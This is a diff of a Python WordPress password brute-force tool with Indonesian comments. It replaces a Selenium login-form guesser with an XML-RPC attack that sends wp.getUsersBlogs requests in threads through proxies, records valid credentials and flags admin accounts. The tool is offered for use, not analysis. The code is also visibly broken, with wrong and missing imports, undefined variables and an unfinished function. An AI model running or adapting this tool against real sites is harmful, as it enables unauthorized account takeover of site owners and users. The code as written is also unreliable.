@@ -1,23 +1,107 @@
 import os
 import time
 import logging
-from tabulate import tabulate
+from more_itertools import tabulate
+import requests
 from termcolor import colored
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.chrome.options import Options
-from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException, WebDriverException
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import re
+import sys
 
+import urllib3  # Tambahkan import sys
+
+# Definisikan variabel global
+total = 0
+correct_pairs = {}
+
+
+# Inisialisasi logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
 
-def read_wordlist(wordlist_file):
-    with open(wordlist_file, 'r') as file:
-        wordlist = file.read().splitlines()
-    return wordlist
 
+# Definisikan warna
+YELLOW = 'yellow'
+GREEN = 'green'
+RED = 'red'
+
+# Fungsi printout yang sesuai
+def printout(text, color):
+    print(colored(text, color))
+
+# Fungsi utama untuk mencoba kata sandi
+def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
+    global correct_pairs
+    if verbose is True or debug is True:
+        if debug is True:
+            thready = "[Thread " + str(thread_no) + "]"
+            printout(thready, YELLOW)
+        print("Trying " + user + " : " + password + "\n",)
+    headers = {'User-Agent': agent,
+               'Connection': 'keep-alive',
+               'Accept': 'text/html'
+               }
+    post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
+    try:
+        req = urllib3.request.Request(url, post.encode(), headers)
+        response = urllib.request.urlopen(req, timeout=3)
+        the_page = response.read()
+        look_for = "isAdmin"
+        try:
+            splitter = the_page.split(look_for, 1)[1]
+            correct_pairs[user] = password
+            print("--------------------------")
+            success = "[" + user + " : " + password + "] are valid credentials!  "
+            adminAlert = ""
+            if splitter[23] == "1":
+                adminAlert = "- THIS ACCOUNT IS ADMIN"
+            printout(success, GREEN)
+            printout(adminAlert, RED)
+            print("\n--------------------------")
+        except:
+            pass
+    except urllib.error.URLError as e:
+        if e.code == 404 or e.code == 403:
+            global total
+            printout(str(e), YELLOW)
+            print(" - WAF or security plugin likely in use")
+            total = len(passlist)
+            return
+        else:
+            printout(str(e), YELLOW)
+            print(" - Try reducing Thread count ")
+            if verbose is True or debug is True:
+                print(user + ":" + password + " was skipped")
+    except socket.timeout as e:
+        printout(str(e), YELLOW)
+        print(" - Try reducing Thread count ")
+        if verbose is True or debug is True:
+            print(user + ":" + password + " was skipped")
+    except socket.error as e:
+        printout(str(e), YELLOW)
+        print(" - Got an RST, Probably tripped the firewall\n",)
+        total = len(passlist)
+        return
+
+def check_login(url, username, wordlist, proxies=None):
+    session = requests.Session()
+
+    # Konfigurasi proxy jika diberikan
+    if proxies:
+        session.proxies.update(proxies)
+
+    # Send a GET request to the login page to retrieve the form data
+    try:
+        login_page_response = session.get(url)
+        login_page_response.raise_for_status()  # Raise an exception for any HTTP error
+    except requests.exceptions.RequestException as e:
+        # Handle connection errors
+        logger.error(f"Connection error occurred during login check: {e}")
+        time.sleep(2)  # Menambahkan penundaan selama 2 detik sebelum mencoba kembali
+        return False, None
+    
 def brute_force(url, username, wordlists):
     results = []
     total_combinations = sum(len(read_wordlist(file)) for file in wordlists)
@@ -48,55 +132,20 @@ def brute_force(url, username, wordlists):
 
     return results, password_found
 
-def check_login(url, username, wordlist):
-    # Setup Selenium
-    service = Service('path/to/chromedriver')  # Ganti dengan path ke chromedriver
-    options = Options()
-    options.add_argument('--headless')  # Menjalankan Chrome di mode headless
-    driver = webdriver.Chrome(service=service, options=options)
+# Fungsi untuk membaca wordlist dari file
+def read_wordlist(wordlist_file):
+    with open(wordlist_file, 'r') as file:
+        wordlist = file.read().splitlines()
+    return wordlist
 
-    try:
-        # Navigasi ke halaman login
-        driver.get(url)
-
-        try:
-            # Cari elemen input username dan tombol submit
-            input_username = driver.find_element(By.ID, "user_login")  # Ganti dengan nama elemen input username pada halaman login
-        except NoSuchElementException:
-            # If the element is not found by ID, try using other locators
-            try:
-                input_username = driver.find_element(By.NAME, "username")  # Example: using the name attribute
-            except NoSuchElementException:
-                # If still not found, try using CSS selector
-                try:
-                    input_username = driver.find_element(By.CSS_SELECTOR, "input[name='username']")
-                except NoSuchElementException:
-                    logger.error("Login elements not found. Check the login page structure.")
-                    raise
-
-        submit_button = driver.find_element(By.ID, "wp-submit")  # Ganti dengan nama elemen tombol submit pada halaman login
-
-        for password in wordlist:
-            try:
-                input_password = driver.find_element(By.ID, "user_pass")  # Ganti dengan nama elemen input password pada halaman login
-                input_password.clear()
-                input_password.send_keys(password)
-                submit_button.click()
-
-                # Lakukan pengecekan apakah login berhasil
-                # Contoh sederhana menggunakan URL setelah login
-                if driver.current_url == "https://example.com/dashboard":  # Ganti dengan URL yang menunjukkan login berhasil
-                    return True, password
-            except StaleElementReferenceException:
-                # Jika terjadi StaleElementReferenceException, cari ulang elemen yang dibutuhkan
-                continue
-            except WebDriverException as e:
-                logger.error(f"Error occurred during login attempt: {e}")
-                raise e
-    finally:
-        driver.quit()
-
-    return False, None
+# Fungsi untuk memeriksa protokol dalam URL
+def protocheck(url):
+    url_pattern = re.compile(
+        r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+"
+    )
+    if not url_pattern.match(url):
+        printout("Incorrect URL. Please include the protocol in the URL.\n", YELLOW)
+        return
 
 if __name__ == "__main__":
     # ASCII Art Header with 7 different colors
@@ -120,11 +169,16 @@ if __name__ == "__main__":
     # Daftar file wordlist yang akan digunakan
     wordlist_files = []
     for i in range(1, 794):
-        wordlist_files.append(f"db/wordlist_{i}.txt")
+        wordlist_files.append(f"db/wordlist_1.txt")
 
     # Buat log file
     log_filename = "brute_force_log.txt"
     log_file = open(log_filename, "a")
+
+    proxies = {
+        'http': 'http://proxy.example.com:8080',
+        'https': 'https://proxy.example.com:8080'
+    }
 
     # Tulis informasi ke log file
     log_file.write(f"URL: {url}\n")
